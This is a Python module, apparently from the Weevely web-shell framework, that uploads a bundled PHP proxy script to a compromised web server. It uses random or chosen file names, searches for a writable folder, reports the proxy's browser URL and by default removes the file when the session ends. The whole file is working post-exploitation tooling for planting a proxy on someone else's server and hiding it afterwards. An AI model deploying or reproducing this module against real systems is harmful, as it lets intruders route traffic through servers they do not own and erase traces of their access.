from core.vectors import ModuleExec
from core.module import Module
from core import modules
from core import messages
from core.loggers import log
import utils
import atexit
import os

class Phpproxy(Module):

    """Install PHP proxy on the target."""

    def init(self):

        self.register_info(
            {
                'author': [
                    'Emilio Pinna'
                ],
                'license': 'GPLv3'
            }
        )

        self.register_arguments([
            { 'name' : 'rpath', 'help' : 'Remote path where to install the PHP proxy script. If it is a folder find the first writable folder in it', 'default' : '.', 'nargs' : '?' },
            { 'name' : '-rname', 'help' : 'Set a specific file name ending with \'.php\'. Default is random', 'default' : '%s.php' % utils.strings.randstr(6).decode('utf-8') },
            { 'name' : '-no-autoremove', 'action' : 'store_true', 'default' : False, 'help' : 'Do not autoremove on exit' }
        ])

    def run(self):

        with open(os.path.join(self.folder, 'poxy.php'), 'r') as proxyfile:
            proxycontent = proxyfile.read()

        result = ModuleExec(
                'file_upload2web',
                [
                    '-content',
                    proxycontent,
                    self.args['rname'],
                    self.args['rpath'] 
                ]
            ).run(self.args)

        if not (
            result and
            len(result[0]) == 2 and
            result[0][0] and
            result[0][1]
        ): return

        log.warn(
            messages.module_net_phpproxy.phpproxy_installed_to_s_browser_to_s % (
                result[0][0],
                result[0][1]
            )
        )

        if self.args['no_autoremove']:
            log.warn(messages.module_net_phpproxy.proxy_script_manually_remove_s % (result[0][0]))
        else:
            log.warn(messages.module_net_phpproxy.proxy_script_removed)
            atexit.register(
                ModuleExec('file_rm', [
                                        result[0][0]
                                    ]
                ).run
            )

        return result



    def print_result(self, result):
        pass
